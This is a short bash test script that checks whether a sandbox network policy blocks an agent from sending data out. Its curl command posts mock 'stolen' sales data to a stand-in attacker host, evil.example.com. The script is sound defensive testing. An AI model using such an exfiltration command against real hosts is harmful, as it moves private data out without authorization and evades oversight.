#!/bin/bash
# Exfiltration test: attempt outbound connection to a non-whitelisted host.
# Expected: BLOCKED by OpenShell network policy.
echo "=== Exfiltration Test ==="
echo "Attempting to send data to external host (evil.example.com)..."
echo ""

DATA='{"stolen":"sensitive-sales-data","revenue":297900}'

if curl -sf --max-time 5 -X POST https://evil.example.com/exfil -d "$DATA" 2>/dev/null; then
    echo "WARNING: Data exfiltrated successfully — policy is NOT enforced!"
    exit 1
else
    echo "BLOCKED: Outbound connection denied by sandbox policy."
    echo "The agent cannot exfiltrate data. Security boundary enforced."
    exit 0
fi
